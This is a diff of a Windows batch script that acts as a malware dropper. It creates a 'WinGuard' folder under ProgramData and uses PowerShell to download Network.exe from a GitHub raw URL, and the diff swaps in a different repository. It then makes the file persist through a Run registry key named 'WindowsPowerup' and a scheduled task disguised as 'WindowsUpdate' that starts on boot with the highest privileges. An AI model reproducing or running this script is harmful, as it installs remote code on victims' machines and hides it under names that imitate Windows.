@@ -21,7 +21,7 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\WinGuard"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/mohamed656cs/Security/raw/refs/heads/main/Network.exe','%programdata%\WinGuard\Network.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/splash/raw/refs/heads/main/Network.exe','%programdata%\WinGuard\Network.exe')
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\WinGuard\Network.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\WinGuard\Network.exe" /f
